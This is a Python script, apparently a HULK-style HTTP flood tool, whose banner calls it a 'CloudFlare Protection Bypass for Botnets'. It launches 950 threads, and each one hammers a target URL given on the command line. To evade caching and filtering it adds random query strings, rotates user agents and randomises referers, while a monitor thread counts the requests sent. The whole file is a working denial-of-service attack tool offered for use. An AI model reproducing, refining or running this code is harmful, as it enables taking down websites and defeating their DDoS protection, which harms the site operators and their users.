# -*- coding: utf-8 -*-


import urllib.request, urllib.error, urllib.parse
import sys
import threading
import random
import re

url = ""
host = ""
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0


def inc_counter():
    global request_counter
    request_counter += 1


def set_flag(val):
    global flag
    flag = val


def set_safe():
    global safe
    safe = 1


def useragent_list():
    global headers_useragents
    try:
        with open("user-agents.txt", "r") as f:
            for line in f:
                user_agent = line.strip()
                if user_agent:
                    headers_useragents.append(user_agent)
    except IOError as e:
        print(f"Error opening file 'user-agents.txt': {e}")
    return headers_useragents


def referer_list():
    global headers_referers
    try:
        with open("referers.txt", "r") as f:
            for line in f:
                refer = line.strip()
                if refer:
                    headers_referers.append(refer)
    except IOError as e:
        print(f"Error opening file 'referers.txt': {e}")
    return headers_referers


def buildblock(size):
    out_str = ""
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str


def usage():
    print("===> Attack command: cfbypass.py [url] <===")
    print("\a")


print("===> CF-Bypass - CloudFlare Protection Bypass for Botnets <===")
print("\a")


def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib.request.Request(
        url
        + param_joiner
        + buildblock(random.randint(3, 10))
        + "="
        + buildblock(random.randint(3, 10))
    )
    request.add_header("User-Agent", random.choice(headers_useragents))
    request.add_header("Cache-Control", "no-cache")
    request.add_header("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
    request.add_header(
        "Referer", random.choice(headers_referers) + buildblock(random.randint(5, 10))
    )
    request.add_header("Keep-Alive", random.randint(110, 120))
    request.add_header("Connection", "keep-alive")
    request.add_header("Host", host)
    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        # rint e.code
        set_flag(1)
        print("[inited]")
        code = 500
    except urllib.error.URLError as e:
        # rint e.reason
        sys.exit()
    else:
        inc_counter()
        urllib.request.urlopen(request)
    return code


class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 500) & (safe == 1):
                    set_flag(2)
        except Exception as ex:
            pass


class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) & (previous != request_counter):
                print("%d Requests Sent" % (request_counter))
                previous = request_counter
        if flag == 2:
            print("\n Script launched")


if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("[inited]")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search("http\://([^/]*)/?.*", url)
        host = m.group(1)
        for i in range(950):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
